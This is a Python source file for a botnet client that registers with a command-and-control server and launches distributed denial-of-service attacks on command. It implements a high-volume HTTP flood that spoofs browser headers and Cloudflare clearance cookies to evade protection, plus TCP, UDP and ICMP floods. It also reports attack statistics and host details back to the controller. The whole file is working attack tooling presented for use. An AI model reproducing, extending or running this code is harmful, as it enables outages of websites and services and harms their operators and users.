#!/usr/bin/env python3
"""
C2 Client - Cloudflare Bypass with EXTREME Performance
Sends thousands of requests per minute with keep-alive
"""
import socketio
import socket
import random
import string
import threading
import time
import sys
import os
import platform
import psutil
import urllib3
import subprocess
from datetime import datetime
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CloudflareBypassEngine:
    """EXTREME attack engine - thousands of requests per minute"""
    
    def __init__(self):
        self.running = False
        self.stats = {
            'requests': 0,
            'success': 0,
            'failed': 0,
            'bytes_sent': 0
        }
        self.stats_lock = threading.Lock()
        self.pools = []
        
        # Multiple browser profiles for rotation
        self.browser_profiles = [
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"Windows"',
            },
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'sec_ch_ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"Windows"',
            },
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            },
            {
                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
            },
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"Windows"',
            },
            {
                'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"Linux"',
            },
            {
                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec_ch_ua_mobile': '?0',
                'sec_ch_ua_platform': '"macOS"',
            }
        ]
    
    def generate_cf_headers(self, target_url, profile_idx):
        """Generate Cloudflare bypass headers"""
        profile = self.browser_profiles[profile_idx % len(self.browser_profiles)]
        
        headers = {
            'User-Agent': profile['ua'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.9,es;q=0.8']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # Add Chrome-specific headers
        if 'sec_ch_ua' in profile:
            headers['Sec-Ch-Ua'] = profile['sec_ch_ua']
            headers['Sec-Ch-Ua-Mobile'] = profile['sec_ch_ua_mobile']
            headers['Sec-Ch-Ua-Platform'] = profile['sec_ch_ua_platform']
        
        # Add referer
        parsed = urlparse(target_url)
        headers['Referer'] = f"{parsed.scheme}://{parsed.netloc}/"
        
        return headers
    
    def generate_cookies(self):
        """Generate realistic cookies"""
        return {
            '_ga': f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}",
            '_gid': f"GA1.1.{random.randint(100000000, 999999999)}.{int(time.time())}",
            'session': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            'cf_clearance': ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=64))
        }
    
    # ============= EXTREME HTTP FLOOD =============
    
    def extreme_http_flood(self, target, duration, method='GET', threads=1000):
        """EXTREME HTTP flood - thousands of requests per minute"""
        print(f"[L7] Starting EXTREME {method} flood on {target}")
        print(f"[L7] Target RPS: {threads * 10}+")
        self.running = True
        
        # Create MANY connection pools
        pool_count = 100
        print(f"[L7] Creating {pool_count} connection pools...")
        for _ in range(pool_count):
            pool = urllib3.PoolManager(
                maxsize=2000,  # Increased pool size
                retries=False,  # No retries for speed
                timeout=urllib3.Timeout(connect=2, read=3),
                cert_reqs='CERT_NONE',
                assert_hostname=False,
                num_pools=200,
                block=False
            )
            self.pools.append(pool)
        
        # Pre-generate everything for speed
        paths = ['/', '/index.html', '/api', '/search', '/products', '/about', '/contact', '/blog', '/news', '/services']
        
        start_time = time.time()
        
        def worker(worker_id):
            pool_idx = worker_id % len(self.pools)
            profile_idx = worker_id % len(self.browser_profiles)
            session_cookies = self.generate_cookies()
            cookie_str = '; '.join(f'{k}={v}' for k, v in session_cookies.items())
            
            # Pre-generate headers for this worker
            base_headers = self.generate_cf_headers(target, profile_idx)
            base_headers['Cookie'] = cookie_str
            
            request_count = 0
            
            while self.running and time.time() - start_time < duration:
                try:
                    pool = self.pools[pool_idx]
                    
                    # Fast URL generation
                    path = paths[request_count % len(paths)]
                    ts = int(time.time() * 1000)
                    url = f"{target.rstrip('/')}{path}?_={ts}&r={request_count}"
                    
                    # Clone headers (faster than regenerating)
                    headers = base_headers.copy()
                    
                    # Send request with minimal timeout
                    if method == 'POST':
                        body = f"data=test{request_count}&ts={ts}".encode()
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                        response = pool.request(method, url, body=body, headers=headers, timeout=2, preload_content=False, retries=False)
                    else:
                        response = pool.request(method, url, headers=headers, timeout=2, preload_content=False, retries=False)
                    
                    # Quick status check
                    success = response.status < 500 and response.status != 403
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        if success:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    response.drain_conn()
                    request_count += 1
                    
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        print(f"[L7] Launching {threads} attack threads...")
        
        # Launch massive thread pool
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, i) for i in range(threads)]
            
            # Monitor attack
            last_check = time.time()
            last_count = 0
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
                
                # Calculate current RPS
                current_time = time.time()
                if current_time - last_check >= 1:
                    current_requests = self.stats['requests']
                    rps = current_requests - last_count
                    last_count = current_requests
                    last_check = current_time
                    
                    print(f"[L7] RPS: {rps:,} | Total: {current_requests:,} | Success: {self.stats['success']:,}")
            
            self.running = False
            
            # Cancel remaining
            for future in futures:
                future.cancel()
        
        # Cleanup
        for pool in self.pools:
            try:
                pool.clear()
            except:
                pass
        
        return self.stats.copy()
    
    # ============= TCP FLOOD =============
    
    def tcp_flood(self, target, duration, threads=500):
        """TCP SYN flood"""
        print(f"[L4] Starting TCP flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        start_time = time.time()
        
        def worker():
            while self.running and time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((host, port))
                    data = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
                    s.send(data)
                    s.close()
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
            
            self.running = False
            for future in futures:
                future.cancel()
        
        return self.stats.copy()
    
    # ============= UDP FLOOD =============
    
    def udp_flood(self, target, duration, threads=200):
        """UDP flood"""
        print(f"[L4] Starting UDP flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        start_time = time.time()
        payloads = [os.urandom(size) for size in [512, 1024, 2048, 4096, 8192]]
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.running and time.time() - start_time < duration:
                try:
                    payload = random.choice(payloads)
                    sock.sendto(payload, (host, port))
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
            
            sock.close()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
            
            self.running = False
            for future in futures:
                future.cancel()
        
        return self.stats.copy()
    
    # ============= ICMP FLOOD =============
    
    def icmp_flood(self, target, duration, threads=100):
        """ICMP flood"""
        print(f"[L3] Starting ICMP flood on {target}")
        self.running = True
        
        host = urlparse(target).netloc if target.startswith('http') else target
        host = host.split(':')[0]
        
        start_time = time.time()
        system = platform.system().lower()
        
        def worker():
            while self.running and time.time() - start_time < duration:
                try:
                    if system == "windows":
                        cmd = f"ping -n 1 -w 100 {host}"
                    else:
                        cmd = f"ping -c 1 -W 1 {host}"
                    
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=1)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
            
            self.running = False
            for future in futures:
                future.cancel()
        
        return self.stats.copy()

class Layer7Client:
    """Client with extreme performance"""
    
    def __init__(self, server_url='http://localhost:5000', client_name=None):
        self.server_url = server_url
        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
        
        # Enhanced SocketIO with keep-alive
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,
            reconnection_delay=1,
            reconnection_delay_max=5,
            logger=False,
            engineio_logger=False,
            ping_interval=25,
            ping_timeout=60,
        )
        
        self.current_attack = None
        self.running = False
        self.attack_thread = None
        self.attack_engine = CloudflareBypassEngine()
        self.last_heartbeat = time.time()
        
        self.setup_handlers()
        
        self.client_info = {
            'name': self.client_name,
            'hostname': platform.node(),
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'python_version': platform.python_version(),
            'has_layer7': True,
            'cloudflare_bypass': True
        }
    
    def setup_handlers(self):
        """Setup SocketIO event handlers"""
        @self.sio.event
        def connect():
            print(f"✅ Connected to C2 Server: {self.server_url}")
            self.last_heartbeat = time.time()
            self.register_client()
        
        @self.sio.event
        def connect_error(data):
            print(f"⚠️ Connection error, retrying...")
        
        @self.sio.event
        def disconnect():
            print("⚠️ Disconnected, reconnecting...")
            self.running = False
        
        @self.sio.event
        def welcome(data):
            print(f"📢 {data['message']}")
            self.last_heartbeat = time.time()
        
        @self.sio.event
        def attack_command(data):
            self.last_heartbeat = time.time()
            print(f"\n🎯 Attack Command Received")
            print(f"   Target: {data.get('target')}")
            print(f"   Method: {data.get('method')}")
            print(f"   Duration: {data.get('duration')}s")
            
            if data.get('command') == 'start':
                self.current_attack = data.get('attack_id')
                self.start_attack(data)
            elif data.get('command') == 'stop':
                self.stop_attack()
    
    def register_client(self):
        """Register client"""
        try:
            self.sio.emit('client_register', self.client_info)
            print(f"✅ Registered: {self.client_name}")
        except Exception as e:
            print(f"⚠️ Registration error: {e}")
    
    def start_attack(self, attack_data):
        """Start attack"""
        if self.attack_thread and self.attack_thread.is_alive():
            print("⚠️ Attack already running")
            return
        
        self.running = True
        self.attack_thread = threading.Thread(target=self.execute_attack, args=(attack_data,), daemon=True)
        self.attack_thread.start()
        
        try:
            self.sio.emit('attack_started', {'attack_id': attack_data.get('attack_id'), 'target': attack_data.get('target')})
        except:
            pass
    
    def execute_attack(self, attack_data):
        """Execute EXTREME attack"""
        attack_id = attack_data.get('attack_id')
        target = attack_data.get('target')
        method = attack_data.get('method', 'http').lower()
        duration = attack_data.get('duration', 60)
        
        cpu_count = psutil.cpu_count()
        
        # EXTREME thread counts
        thread_map = {
            'http': min(cpu_count * 200, 1000),
            'get': min(cpu_count * 200, 1000),
            'post': min(cpu_count * 200, 1000),
            'tcp': min(cpu_count * 100, 500),
            'udp': min(cpu_count * 50, 200),
            'icmp': min(cpu_count * 20, 100),
            'ping': min(cpu_count * 20, 100)
        }
        threads = thread_map.get(method, 1000)
        
        try:
            print(f"\n{'='*60}")
            print(f"💥 EXTREME ATTACK MODE")
            print(f"   Target: {target}")
            print(f"   Method: {method.upper()}")
            print(f"   Duration: {duration}s")
            print(f"   Threads: {threads}")
            print(f"   Expected RPS: {threads * 10}+")
            print(f"{'='*60}\n")
            
            start_time = time.time()
            
            self.attack_engine.stats = {'requests': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0}
            
            # Execute
            if method in ['http', 'get']:
                results = self.attack_engine.extreme_http_flood(target, duration, 'GET', threads)
            elif method == 'post':
                results = self.attack_engine.extreme_http_flood(target, duration, 'POST', threads)
            elif method == 'tcp':
                results = self.attack_engine.tcp_flood(target, duration, threads)
            elif method == 'udp':
                results = self.attack_engine.udp_flood(target, duration, threads)
            elif method in ['icmp', 'ping']:
                results = self.attack_engine.icmp_flood(target, duration, threads)
            else:
                results = self.attack_engine.extreme_http_flood(target, duration, 'GET', threads)
            
            elapsed = time.time() - start_time
            actual_rps = results['requests'] / elapsed if elapsed > 0 else 0
            success_rate = (results['success'] / results['requests'] * 100) if results['requests'] > 0 else 0
            
            # Report
            try:
                self.sio.emit('attack_complete', {
                    'attack_id': attack_id,
                    'results': {
                        'requests': results['requests'],
                        'success': success_rate,
                        'rps': actual_rps,
                        'duration': elapsed,
                        'method': method,
                        'bytes_sent': results['bytes_sent']
                    }
                })
            except:
                pass
            
            print(f"\n✅ Attack Complete")
            print(f"   💥 Requests: {results['requests']:,}")
            print(f"   ✅ Success: {results['success']:,}")
            print(f"   ⚡ RPS: {actual_rps:.1f}")
            print(f"   📊 Rate: {success_rate:.1f}%")
            
        except Exception as e:
            print(f"\n❌ Error: {e}")
        finally:
            self.running = False
            self.attack_engine.running = False
            self.current_attack = None
    
    def stop_attack(self):
        """Stop attack"""
        self.running = False
        self.attack_engine.running = False
        print("🛑 Attack stopped")
    
    def heartbeat_monitor(self):
        """Keep connection alive"""
        while True:
            try:
                if self.sio.connected:
                    if time.time() - self.last_heartbeat > 20:
                        try:
                            self.sio.emit('ping', {'timestamp': time.time()})
                            self.last_heartbeat = time.time()
                        except:
                            pass
                    
                    try:
                        self.sio.emit('client_stats', {
                            'stats': {
                                'cpu_usage': psutil.cpu_percent(interval=1),
                                'memory_usage': psutil.virtual_memory().percent,
                                'timestamp': datetime.now().isoformat()
                            }
                        })
                    except:
                        pass
                
                time.sleep(10)
            except:
                time.sleep(10)
    
    def connect(self):
        """Connect to server"""
        try:
            print("\n" + "="*60)
            print("💥 EXTREME ATTACK CLIENT")
            print(f"🔗 Server: {self.server_url}")
            print(f"🏷️  Name: {self.client_name}")
            print(f"⚡ CPUs: {psutil.cpu_count()}")
            print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
            print(f"🔥 Mode: EXTREME (Thousands/min)")
            print("="*60 + "\n")
            
            print("⚡ Connecting...")
            
            self.sio.connect(self.server_url, wait_timeout=30, transports=['websocket', 'polling'])
            
            print("\n✅ Connected!")
            print("📡 Keep-alive enabled")
            print("⚡ Ready for commands\n")
            
            heartbeat = threading.Thread(target=self.heartbeat_monitor, daemon=True)
            heartbeat.start()
            
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Stopped by user")
            self.disconnect()
        except Exception as e:
            print(f"\n❌ Error: {e}")
            self.disconnect()
    
    def disconnect(self):
        """Disconnect"""
        self.running = False
        self.attack_engine.running = False
        if self.sio.connected:
            try:
                self.sio.disconnect()
            except:
                pass

def main():
    """Main"""
    print("""
    ╔══════════════════════════════════════╗
    ║     EXTREME ATTACK CLIENT           ║
    ║  Thousands of Requests Per Minute   ║
    ║  Cloudflare Bypass • Keep-Alive     ║
    ╚══════════════════════════════════════╝
    """)
    
    default_server = "https://c2-server-io.onrender.com"
    
    server_url = input(f"🌐 Server [{default_server}]: ").strip()
    if not server_url:
        server_url = default_server
    
    if not server_url.startswith('http'):
        server_url = 'https://' + server_url
    
    client_name = input(f"🏷️  Name [{platform.node()}]: ").strip()
    if not client_name:
        client_name = platform.node()
    
    client = Layer7Client(server_url=server_url, client_name=client_name)
    client.connect()

if __name__ == "__main__":
    main()
